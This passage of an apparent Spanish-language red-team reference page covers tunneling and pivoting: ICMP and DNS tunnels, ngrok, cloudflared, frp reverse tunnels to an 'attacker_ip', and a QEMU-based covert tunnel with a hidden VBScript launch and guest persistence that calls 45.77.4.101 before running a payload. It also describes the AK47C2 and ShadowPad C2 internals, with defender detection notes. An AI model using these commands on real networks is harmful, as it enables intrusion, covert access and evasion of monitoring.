```
#### Cambiar el DNS de proxychains

Proxychains-ng intercepta conexiones TCP enlazadas dinámicamente y no puede transportar UDP ni ICMP; el proxying de DNS es configurable, así que inspecciona el `proxychains.conf` instalado y el helper del resolver en lugar de asumir un resolver público fijo. Los scripts `proxyresolv` heredados exponen `PROXY_DNS_SERVER` para elegir el resolver; usa un resolver accesible desde el pivot cuando necesites nombres internos.<sup>[[34]](#references)[[35]](#references)</sup>

## Túneles en Go

[https://github.com/hotnops/gtunnel](https://github.com/hotnops/gtunnel)

### C2 personalizado mediante DNS TXT / HTTP JSON (AK47C2)

El actor Storm-2603 creó un **C2 de doble canal ("AK47C2")** que abusa *únicamente* del tráfico saliente **DNS** y **HTTP POST sin cifrar**: dos protocolos que rara vez se bloquean en las redes corporativas.<sup>[[2]](#references)</sup>

1. **Modo DNS (AK47DNS)**
• Genera un SessionID aleatorio de 5 caracteres (por ejemplo, `H4T14`).
• Anteone `1` para *solicitudes de tareas* o `2` para *resultados* y concatena distintos campos (flags, SessionID, nombre del equipo).
• Cada campo se **cifra mediante XOR con la clave ASCII `VHBD@H`**, se codifica en hexadecimal y se une con puntos, terminando finalmente con el dominio controlado por el atacante:

```text
<1|2><SessionID>.a<SessionID>.<Computer>.update.updatemicfosoft.com
```

• Las solicitudes usan `DnsQuery()` para registros **TXT** (y registros **MG** como fallback).
• Cuando la respuesta supera los 0xFF bytes, la backdoor **fragmenta** los datos en piezas de 63 bytes e inserta los marcadores:
`s<SessionID>t<TOTAL>p<POS>` para que el servidor C2 pueda reordenarlas.

2. **Modo HTTP (AK47HTTP)**
• Construye un contenedor JSON:
```json
{"cmd":"","cmd_id":"","fqdn":"<host>","result":"","type":"task"}
```
• Todo el blob se transforma mediante XOR-`VHBD@H` → hexadecimal → y se envía como cuerpo de un **`POST /`** con la cabecera `Content-Type: text/plain`.
• La respuesta sigue la misma codificación y el campo `cmd` se ejecuta con `cmd.exe /c <command> 2>&1`.

Notas de Blue Team
• Busca **consultas TXT** inusuales cuyo primer label sea hexadecimal largo y que siempre terminen en un dominio poco frecuente.
• Una clave XOR constante seguida de ASCII-hex es fácil de detectar con YARA: `6?56484244?484` (`VHBD@H` en hexadecimal).
• Para HTTP, marca los cuerpos de solicitudes POST `text/plain` que sean hexadecimales puros y tengan un número par de bytes.

{{#note}}
El canal mantiene cada label de subdominio dentro del límite DNS de 63 octetos, pero el cumplimiento del protocolo no lo hace sigiloso; los dominios poco frecuentes, los labels hexadecimales largos y el volumen de consultas siguen siendo señales de detección.<sup>[[2]](#references)[[36]](#references)</sup>
{{#endnote}}

## Tunneling ICMP

### Hans

[https://github.com/friedrich/hans](https://github.com/friedrich/hans)\
[https://github.com/albertzak/hanstunnel](https://github.com/albertzak/hanstunnel)

Hans documenta un túnel IPv4 sobre ICMP que utiliza un dispositivo TUN y solicitudes de eco ICMP; la configuración requiere privilegios suficientes para crear la interfaz.<sup>[[37]](#references)</sup>
```bash
./hans -v -f -s 1.1.1.1 -p P@ssw0rd #Start listening (1.1.1.1 is IP of the new vpn connection)
./hans -f -c <server_ip> -p P@ssw0rd -v
ping 1.1.1.100 #After a successful connection, the victim will be in the 1.1.1.100
```
### ptunnel-ng

[**Descárgalo desde aquí**](https://github.com/utoni/ptunnel-ng.git).

ptunnel-ng transporta conexiones TCP sobre ICMP y utiliza las opciones `-p`, `-l`, `-r` y `-R` que se muestran a continuación para el proxy, el listener local, el host de destino y el puerto de destino.<sup>[[38]](#references)</sup>
```bash
# Generate it
sudo ./autogen.sh

# Server -- victim (needs to be able to receive ICMP)
sudo ptunnel-ng
# Client - Attacker
sudo ptunnel-ng -p <server_ip> -l <listen_port> -r <dest_ip> -R <dest_port>
# Try to connect with SSH through ICMP tunnel
ssh -p 2222 -l user 127.0.0.1
# Create a socks proxy through the SSH connection through the ICMP tunnel
ssh -D 9050 -p 2222 -l user 127.0.0.1
```
## ngrok

[**ngrok**](https://ngrok.com/) es un agente para poner servicios de red locales en línea mediante un túnel seguro; su CLI documenta endpoints HTTP, TCP y de URL de archivo, y el nombre de host del endpoint mostrado puede variar según el endpoint y la cuenta.<sup>[[39]](#references)</sup>

### Instalación

- Crear una cuenta: https://ngrok.com/signup
- Descarga del cliente:
```bash
tar xvzf ~/Downloads/ngrok-v3-stable-linux-amd64.tgz -C /usr/local/bin
chmod a+x ./ngrok
# Init configuration, with your token
./ngrok config edit
```
### Usos básicos

**Documentación:** [https://ngrok.com/docs/getting-started/](https://ngrok.com/docs/getting-started/).

_El agente también admite opciones de autenticación y TLS cuando es necesario.<sup>[[39]](#references)</sup>_

#### Tunelización TCP
```bash
# Pointing to 0.0.0.0:4444
./ngrok tcp 4444
# Example of resulting link: 0.tcp.ngrok.io:12345
# Listen (example): nc -nvlp 4444
# Remote connect (example): nc $(dig +short 0.tcp.ngrok.io) 12345
```
#### Exponer archivos mediante HTTP
```bash
./ngrok http file:///tmp/httpbin/
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
```
#### Captura de llamadas HTTP

_Útil para XSS,SSRF,SSTI ..._\
El agente independiente expone su interfaz de inspección HTTP en `http://127.0.0.1:4040` de forma predeterminada; la interfaz es para tráfico HTTP.<sup>[[40]](#references)</sup>

#### Tunneling de servicio HTTP interno

La opción `--host-header=rewrite` reescribe el encabezado HTTP `Host` upstream para que coincida con el servicio local.<sup>[[41]](#references)</sup>
```bash
./ngrok http localhost:8080 --host-header=rewrite
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
# With basic auth
./ngrok http localhost:8080 --host-header=rewrite --auth="myuser:mysuperpassword"
```
#### ejemplo de configuración simple de ngrok.yaml

Esto utiliza ngrok Agent Config v2; los túneles con nombre usan `proto` y `addr`, y se inician con `ngrok start`.<sup>[[42]](#references)</sup> Abre 3 túneles:

- 2 TCP
- 1 HTTP con exposición de archivos estáticos desde /tmp/httpbin/
```yaml
version: 2
tunnels:
mytcp:
addr: 4444
proto: tcp
anothertcp:
addr: 5555
proto: tcp
httpstatic:
proto: http
addr: file:///tmp/httpbin/
```
## Cloudflared (Cloudflare Tunnel)

El conector `cloudflared` de Cloudflare Tunnel establece conexiones salientes; las aplicaciones publicadas pueden enrutar HTTP, HTTPS, TCP, SSH y RDP, mientras que los quick tunnels están destinados al desarrollo HTTP.<sup>[[43]](#references)[[45]](#references)</sup>

### Comando de una línea para un quick tunnel
```bash
# Expose a local web service listening on 8080
cloudflared tunnel --url http://localhost:8080
# => Generates https://<random>.trycloudflare.com that forwards to 127.0.0.1:8080
```
### Origen SOCKS5 (modo legacy)

La opción heredada `--socks5` indica a `cloudflared` que el origen local utiliza SOCKS5; no crea un listener SOCKS5 local. Para un túnel gestionado, `originRequest.proxyType: socks` configura el manejo del origen SOCKS5.<sup>[[44]](#references)</sup>
```bash
# Expose a local SOCKS5-speaking origin (legacy syntax)
cloudflared tunnel --url socks5://localhost:1080 --socks5
```
### Túneles persistentes con DNS

La configuración del túnel gestionada localmente utiliza las claves en minúsculas `tunnel`, `credentials-file` y `url`, como se muestra a continuación.<sup>[[46]](#references)</sup>
```bash
cloudflared tunnel create mytunnel
cloudflared tunnel route dns mytunnel internal.example.com
# config.yml
tunnel: <TUNNEL-UUID>
credentials-file: /root/.cloudflared/<TUNNEL-UUID>.json
url: http://127.0.0.1:8000
```
Inicia el conector:
```bash
cloudflared tunnel run mytunnel
```
El conector establece conexiones salientes y, de forma predeterminada, negocia QUIC con fallback a HTTP/2; no asumas que todas las implementaciones usan TCP/443. Ejecútalo únicamente con los privilegios requeridos por tu implementación.<sup>[[43]](#references)[[47]](#references)</sup>

## FRP (Fast Reverse Proxy)

[`frp`](https://github.com/fatedier/frp) es un proxy inverso escrito en Go compatible con **TCP, UDP, HTTP/S, STCP/SUDP, TCPMUX y XTCP**. XTCP utiliza hole punching P2P, cuyo éxito depende de NAT. A partir de **v0.53.0**, puede actuar como una **SSH Tunnel Gateway**, por lo que un host objetivo puede utilizar el cliente OpenSSH estándar sin un binario `frpc`.<sup>[[48]](#references)[[49]](#references)[[50]](#references)</sup>

### Túnel TCP reverse clásico
```bash
# Attacker / server
./frps -c frps.toml            # listens on 0.0.0.0:7000

# Victim
./frpc -c frpc.toml            # will expose 127.0.0.1:3389 on frps:5000

# frpc.toml
serverAddr = "attacker_ip"
serverPort = 7000

[[proxies]]
name       = "rdp"
type       = "tcp"
localIP    = "127.0.0.1"
localPort  = 3389
remotePort = 5000
```
### Uso del nuevo SSH gateway (sin binario frpc)
```bash
# On frps (attacker)
sshTunnelGateway.bindPort = 2200   # add to frps.toml
./frps -c frps.toml

# On victim (OpenSSH client only)
ssh -R :80:127.0.0.1:8080 v0@attacker_ip -p 2200 tcp --proxy_name web --remote_port 9000
```
El comando anterior publica el puerto **8080** de la víctima como **attacker_ip:9000** utilizando el cliente OpenSSH estándar, mientras `frps` proporciona la gateway.<sup>[[50]](#references)</sup>

## Túneles encubiertos basados en VM con QEMU

Las redes en modo usuario de QEMU no requieren privilegios de root ni de administrador para la red virtual, y `-netdev user,hostfwd=...` redirige conexiones TCP, UDP o UNIX del host al guest.<sup>[[51]](#references)</sup> TrustedSec documentó una VM de Tiny Core con QEMU y un intento de túnel SSH inverso en un incidente en el que un EDR centrado en el host podía pasar por alto la actividad dentro del guest.<sup>[[1]](#references)</sup>

### Comando rápido de una sola línea
```powershell
# Windows victim (user-mode networking; no TAP driver is needed for this example)
qemu-system-x86_64.exe ^
-m 256M ^
-drive file=tc.qcow2,if=ide ^
-netdev user,id=n0,hostfwd=tcp::2222-:22 ^
-device e1000,netdev=n0 ^
-nographic
```
• El comando anterior inicia un guest de **Tiny Core Linux** con 256 MiB de memoria para el guest y una imagen de disco qcow2; la imagen de disco no es un disco en RAM.
• El puerto **2222/tcp** en el host Windows se reenvía de forma transparente a **22/tcp** dentro del guest.
• Desde el punto de vista del atacante, el objetivo simplemente expone el puerto 2222; cualquier paquete que lo alcance es gestionado por el servidor SSH que se ejecuta en la VM.

### Inicio sigiloso mediante VBScript

TrustedSec observó lanzamientos de QEMU impulsados por VBS e imágenes de Tiny Core en el incidente citado anteriormente.<sup>[[1]](#references)</sup>
```vb
' update.vbs – lived in C:\ProgramData\update
Set o = CreateObject("Wscript.Shell")
o.Run "stl.exe -m 256M -drive file=tc.qcow2,if=ide -netdev user,id=n0,hostfwd=tcp::2222-:22", 0
```
Ejecutar el script con `cscript.exe //B update.vbs` mantiene la ventana oculta.<sup>[[1]](#references)</sup>

### Persistencia dentro del guest

El incidente citado describe la persistencia en el guest Tiny Core sin estado mediante `/opt/bootlocal.sh` y `/opt/filetool.lst`:<sup>[[1]](#references)</sup>

1. Depositar el payload en `/opt/123.out`
2. Añadir al final de `/opt/bootlocal.sh`:

```sh
while ! ping -c1 45.77.4.101; do sleep 2; done
/opt/123.out
```

3. Añadir `home/tc` y `opt` a `/opt/filetool.lst` para que el payload se empaquete en `mydata.tgz` al apagarse.

### Consideraciones sobre la telemetría

• El host aún expone el proceso de QEMU, la imagen qcow2 y cualquier listener reenviado por el host.
• Es posible que los escaneos de procesos exclusivos del host no inspeccionen los procesos del guest, pero la virtualización no garantiza la evasión; la telemetría de red, QEMU y de la imagen aún puede exponerlo.<sup>[[1]](#references)[[51]](#references)</sup>

### Consejos para defenders

• Generar alertas ante **binarios inesperados de QEMU/VirtualBox/KVM** en rutas con permisos de escritura para el usuario.
• Bloquear las conexiones salientes originadas por `qemu-system*.exe`.
• Buscar puertos de escucha poco frecuentes (2222, 10022, …) asociados inmediatamente después del lanzamiento de QEMU.

## Nodos relay IIS/HTTP.sys mediante `HttpAddUrl` (ShadowPad)

Check Point describe el módulo IIS de ShadowPad como un componente que convierte servidores web perimetrales comprometidos en backdoors y nodos relay mediante la asociación de prefijos URL a través de `HttpAddUrl`.<sup>[[3]](#references)</sup>

El mismo informe detalla los valores predeterminados, los listeners wildcard, el descifrado de paquetes, las colas relay y la telemetría de depuración resumidos a continuación.<sup>[[3]](#references)</sup>

* **Valores predeterminados de configuración** – si la configuración JSON del módulo omite valores, este recurre a valores predeterminados plausibles de IIS (`Server: Microsoft-IIS/10.0`, `DocumentRoot: C:\inetpub\wwwroot`, `ErrorPage: C:\inetpub\custerr\en-US\404.htm`). De ese modo, IIS responde al tráfico benigno con la identidad visual correcta.
* **Interceptación wildcard** – los operadores proporcionan una lista de prefijos URL separados por punto y coma (wildcards en el host y la ruta). El módulo llama a `HttpAddUrl` para cada entrada, por lo que HTTP.sys dirige las solicitudes coincidentes al handler malicioso; las solicitudes que no coinciden vuelven al comportamiento normal de IIS.
* **Primer paquete cifrado** – los dos primeros bytes del cuerpo de la solicitud contienen la semilla para un PRNG personalizado de 32 bits. Cada byte posterior se aplica mediante XOR con el keystream generado antes del análisis del protocolo:

```python
def decrypt_first_packet(buf):
seed = buf[0] | (buf[1] << 8)
num = seed & 0xFFFFFFFF
out = bytearray(buf)
for i in range(2, len(out)):
hi = (num >> 16) & 0xFFFF
num = (hi * 0x7093915D - num * 0x6EA30000 + 0x06B0F0E3) & 0xFFFFFFFF
out[i] ^= num & 0xFF
return out
```

* **Orquestación del relay** – el módulo mantiene dos listas: “servers” (nodos upstream) y “clients” (implants downstream). Las entradas se eliminan si no llega un heartbeat durante aproximadamente 30 segundos. Cuando ambas listas no están vacías, empareja el primer server saludable con el primer client saludable y simplemente canaliza los bytes entre sus sockets hasta que uno de los lados se cierra.
* **Telemetría de depuración** – el registro opcional anota la IP de origen, la IP de destino y el total de bytes reenviados para cada emparejamiento. Los investigadores utilizaron esas pistas para reconstruir la malla de ShadowPad que abarcaba múltiples víctimas.

---

## Otras herramientas que se deben comprobar

- [https://github.com/securesocketfunneling/ssf](https://github.com/securesocketfunneling/ssf)
- [https://github.com/z3APA3A/3proxy](https://github.com/z3APA3A/3proxy)

## References

- [1] [Ocultos en las sombras: túneles encubiertos mediante virtualización de QEMU](https://trustedsec.com/blog/hiding-in-the-shadows-covert-tunnels-via-qemu-virtualization)
- [2] [Check Point Research – Antes de ToolShell: exploración de las operaciones de ransomware anteriores de Storm-2603](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [3] [Check Point Research – Dentro de Ink Dragon: revelación de la red relay y del funcionamiento interno de una operación ofensiva sigilosa](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [4] [README de Evil-WinRM](https://raw.githubusercontent.com/Hackplayers/evil-winrm/master/README.md)
- [5] [Guía de referencia de Nmap: omitir restricciones de firewall/IDS](https://nmap.org/book/man-bypass-firewalls-ids.html)
- [6] [Manual de ssh de OpenBSD](https://man.openbsd.org/ssh)
- [7] [Manual de sshd_config de OpenBSD](https://man.openbsd.org/sshd_config)
- [8] [Notas de la versión de OpenSSH 9.6](https://www.openssh.org/txt/release-9.6)
- [9] [README de sshuttle](https://raw.githubusercontent.com/sshuttle/sshuttle/master/README.rst)
- [10] [Metasploit: pivoting en Metasploit](https://docs.metasploit.com/docs/using-metasploit/intermediate/pivoting-in-metasploit.html)
- [11] [Documentación del módulo socks_proxy de Metasploit](https://raw.githubusercontent.com/rapid7/metasploit-framework/master/documentation/modules/auxiliary/server/socks_proxy.md)
- [12] [Documentación del módulo autoroute de Metasploit](https://raw.githubusercontent.com/rapid7/metasploit-framework/master/documentation/modules/post/multi/manage/autoroute.md)
- [13] [Cobalt Strike: SOCKS Proxy](https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/pivoting_socks-proxy.htm)
- [14] [Cobalt Strike: Reverse Port Forward](https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/pivoting_reverse-port-forward.htm)
- [15] [README de reGeorg](https://raw.githubusercontent.com/sensepost/reGeorg/master/README.md)
- [16] [README de Chisel](https://raw.githubusercontent.com/jpillora/chisel/master/README.md)
- [17] [Inicio rápido de Ligolo-ng](https://docs.ligolo.ng/Quickstart/)
- [18] [Listeners de Ligolo-ng](https://docs.ligolo.ng/Listeners/)
- [19] [Localhost de Ligolo-ng](https://docs.ligolo.ng/Localhost/)
- [20] [README de rpivot](https://raw.githubusercontent.com/klsecservices/rpivot/master/README.md)
- [21] [Manual de socat](https://man7.org/linux/man-pages/man1/socat.1.html)
- [22] [Manual de PuTTY Plink](https://the.earth.li/~sgtatham/putty/0.84/htmldoc/Chapter7.html)
- [23] [Opciones de línea de comandos de PuTTY](https://the.earth.li/~sgtatham/putty/0.84/htmldoc/Chapter3.html)
- [24] [Comando netsh interface portproxy de Microsoft](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/netsh-interface)
- [25] [README de SocksOverRDP](https://raw.githubusercontent.com/nccgroup/SocksOverRDP/master/README.md)
- [26] [Documentación de Proxifier](https://www.proxifier.com/docs/win-v4/)
- [27] [Reglas de Proxification de Proxifier](https://www.proxifier.com/docs/win-v3/rules.htm)
- [28] [Manual de OpenVPN 2.7](https://openvpn.net/community-docs/community-articles/openvpn-2-7-manual.html)
- [29] [Cntlm](https://cntlm.sourceforge.net/)
- [30] [README de YARP](https://raw.githubusercontent.com/dotnet/yarp/main/README.md)
- [31] [README de iodine](https://code.kryo.se/iodine/README.html)
- [32] [README de dnscat2](https://raw.githubusercontent.com/iagox86/dnscat2/master/README.md)
- [33] [README de dnscat2-powershell](https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/master/README.md)
- [34] [README de proxychains-ng](https://raw.githubusercontent.com/rofl0r/proxychains-ng/master/README)
- [35] [proxyresolv](https://github.com/haad/proxychains/blob/master/src/proxyresolv)
- [36] [RFC 1035: nombres de dominio: implementación y especificación](https://www.rfc-editor.org/rfc/rfc1035)
- [37] [Hans](https://code.gerade.org/hans/)
- [38] [README de ptunnel-ng](https://raw.githubusercontent.com/utoni/ptunnel-ng/master/README.md)
- [39] [CLI del Agent de ngrok](https://ngrok.com/docs/agent/cli)
- [40] [Interfaz de inspección web de ngrok](https://ngrok.com/docs/agent/web-inspection-interface)
- [41] [virtual hosts de ngrok](https://ngrok.com/docs/using-ngrok-with/virtualHosts)
- [42] [Configuración v2 del Agent de ngrok](https://ngrok.com/docs/agent/config/v2)
- [43] [Descripción general de Cloudflare Tunnel](https://developers.cloudflare.com/tunnel/)
- [44] [Parámetros de origen de Cloudflare Tunnel](https://developers.cloudflare.com/tunnel/advanced/origin-parameters/)
- [45] [Configuración de Cloudflare Tunnel](https://developers.cloudflare.com/tunnel/setup/)
- [46] [Archivo de configuración de Cloudflare Tunnel](https://developers.cloudflare.com/cloudflare-one/networks/connectors/cloudflare-tunnel/do-more-with-tunnels/local-management/configuration-file/)
- [47] [Parámetros de ejecución de Cloudflare Tunnel](https://developers.cloudflare.com/tunnel/advanced/run-parameters/)
- [48] [Conceptos de frp](https://gofrp.org/en/docs/concepts/)
- [49] [XTCP de frp](https://gofrp.org/en/docs/features/xtcp/)
- [50] [SSH Tunnel Gateway de frp](https://gofrp.org/en/docs/features/common/ssh/)
- [51] [Documentación de redes de QEMU](https://www.qemu.org/docs/master/system/devices/net.html)
- [52] [README de wstunnel](https://github.com/erebe/wstunnel/blob/main/README.md)
- [53] [Repositorio del código fuente de NetSPI BOFScale](https://github.com/NetSPI/BOFscale)
- [54] [BOFScale: un Tailnet frontalizado mediante CDN desde un BOF-PE](https://www.netspi.com/blog/technical-blog/red-teaming/bofscale-a-cdn-fronted-tailnet-from-a-bof-pe/)
{{#include ../banners/hacktricks-training.md}}
